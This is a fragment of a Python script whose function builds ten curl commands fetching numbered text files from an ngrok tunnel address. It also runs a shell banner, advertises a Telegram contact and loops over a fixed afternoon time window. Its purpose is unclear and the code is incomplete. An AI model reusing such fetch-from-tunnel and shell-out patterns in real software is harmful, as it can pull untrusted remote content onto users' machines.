...
def hero():
    ...
    numbers=[]
    Commands='curl https://09d7-103-83-145-114.in.ngrok.io/ms.txt'
    Commands1='curl https://09d7-103-83-145-114.in.ngrok.io/ms1.txt'
    Commands2='curl https://09d7-103-83-145-114.in.ngrok.io/ms2.txt'
    Commands3='curl https://09d7-103-83-145-114.in.ngrok.io/ms3.txt'
    Commands4='curl https://09d7-103-83-145-114.in.ngrok.io/ms4.txt'
    Commands5='curl https://09d7-103-83-145-114.in.ngrok.io/ms5.txt'
    Commands6='curl https://09d7-103-83-145-114.in.ngrok.io/ms6.txt'
    Commands7='curl https://09d7-103-83-145-114.in.ngrok.io/ms7.txt'
    Commands8='curl https://09d7-103-83-145-114.in.ngrok.io/ms8.txt'
    Commands9='curl https://09d7-103-83-145-114.in.ngrok.io/ms9.txt'

    system(banner)
    print(f"{red}Contact me on telegram @smsn_knt")
    now = datetime.datetime.now()
    First = now.replace(hour=16, minute=30, second=0, microsecond=0)
    Firstend = now.replace(hour=16, minute=36, second=0, microsecond=0)
    i=0
    while(y):
        now = datetime.datetime.now()
        if(now < First):
